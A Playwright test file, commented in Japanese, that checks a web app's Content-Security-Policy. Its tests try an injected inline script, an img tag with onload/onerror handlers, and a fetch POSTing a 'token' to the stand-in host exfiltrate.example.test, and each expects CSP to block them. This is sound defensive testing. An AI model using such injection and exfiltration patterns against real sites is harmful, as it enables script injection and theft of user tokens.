import type { Page } from '@playwright/test'
import { RICH_CONTENT_IMAGE, expect, installApiMock, test } from './mock'

// csp project（build:csp-e2e: VITE_E2E=true の本番ビルドを vite preview で配る）で動く。

const CHANGE = '@harden-sensitive-data-protection'

type Violation = { effectiveDirective: string; violatedDirective: string; blockedURI: string }
type ProbeWindow = Window & {
  __cspViolations: Violation[]
  __inlineScriptRan?: boolean
  __handlerRan?: boolean
}

/** 文書が作られた直後から securitypolicyviolation を記録する。 */
async function recordCspViolations(page: Page) {
  await page.addInitScript(() => {
    const probe = window as unknown as ProbeWindow
    probe.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (event) => {
      probe.__cspViolations.push({
        effectiveDirective: event.effectiveDirective,
        violatedDirective: event.violatedDirective,
        blockedURI: event.blockedURI,
      })
    })
  })
}

function violations(page: Page) {
  return page.evaluate(() => (window as unknown as ProbeWindow).__cspViolations)
}

async function openSignedIn(page: Page) {
  await page.goto('/')
  await expect(page.getByTestId('channel-tree')).toBeVisible()
  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  expect(policy, 'build:csp-e2e must serve the CSP meta').toContain("script-src 'self'")
}

test(
  '無害化をすり抜けたインラインスクリプトとイベントハンドラ属性は実行されない',
  { tag: [CHANGE, '@TP-004'] },
  async ({ page }) => {
    // fixture: build:csp-e2e + mock:signed-in-with-emojis
    await installApiMock(page)
    await recordCspViolations(page)
    await openSignedIn(page)

    await page.evaluate(() => {
      const script = document.createElement('script')
      script.textContent = 'window.__inlineScriptRan = true'
      document.body.append(script)
      const host = document.createElement('div')
      host.innerHTML =
        '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"' +
        ' onload="window.__handlerRan = true" onerror="window.__handlerRan = true">'
      document.body.append(host)
    })

    await expect
      .poll(async () => (await violations(page)).filter((v) => v.effectiveDirective.startsWith('script-src')).length)
      .toBeGreaterThanOrEqual(2)
    const ran = await page.evaluate(() => {
      const probe = window as unknown as ProbeWindow
      return { inline: probe.__inlineScriptRan ?? false, handler: probe.__handlerRan ?? false }
    })
    expect(ran).toEqual({ inline: false, handler: false })
    const directives = (await violations(page)).map((v) => v.effectiveDirective)
    expect(directives).toEqual(expect.arrayContaining(['script-src-elem', 'script-src-attr']))
  },
)

test(
  '許可していない接続先への通信は遮断され、connect-src の違反として記録される',
  { tag: [CHANGE, '@TP-005'] },
  async ({ page }) => {
    // fixture: build:csp-e2e + mock:signed-in-with-emojis
    await installApiMock(page)
    await recordCspViolations(page)
    let reached = 0
    await page.route('https://exfiltrate.example.test/**', async (route) => {
      reached += 1
      await route.fulfill({ status: 200, body: 'ok', headers: { 'Access-Control-Allow-Origin': '*' } })
    })
    await openSignedIn(page)

    const outcome = await page.evaluate(async () => {
      try {
        await fetch('https://exfiltrate.example.test/collect', { method: 'POST', body: 'token' })
        return 'sent'
      } catch {
        return 'blocked'
      }
    })

    expect(outcome).toBe('blocked')
    expect(reached).toBe(0)
    await expect
      .poll(async () =>
        (await violations(page)).filter(
          (v) => v.effectiveDirective === 'connect-src' && v.blockedURI.startsWith('https://exfiltrate.example.test'),
        ).length,
      )
      .toBe(1)
  },
)

test(
  'コードブロック・Mermaid 図・画像添付がポリシー違反なしで描画される',
  { tag: [CHANGE, '@TP-006'] },
  async ({ page }) => {
    // fixture: build:csp-e2e + mock:rich-content-post
    await installApiMock(page, { richContentPost: true })
    await recordCspViolations(page)
    await openSignedIn(page)
    await page.getByTestId('channel-rich').click()

    // Shiki のハイライト（WASM の正規表現エンジン）が効くと、プレーンな <pre> が .shiki に置き換わる。
    await expect(page.getByTestId('code-block').locator('pre.shiki')).toBeVisible()
    await expect(page.getByTestId('code-block').locator('pre.shiki span[style]').first()).toBeVisible()
    await expect(page.getByTestId('mermaid-block').locator('svg')).toBeVisible()
    await expect(page.getByTestId('mermaid-block').getByText('開始')).toBeVisible()
    const image = page.getByTestId('attachment-gallery').getByRole('img', { name: RICH_CONTENT_IMAGE.fileName })
    await expect(image).toBeVisible()
    await expect
      .poll(() => image.evaluate((el) => (el as HTMLImageElement).complete && (el as HTMLImageElement).naturalWidth > 0))
      .toBe(true)

    expect(await violations(page)).toEqual([])
  },
)
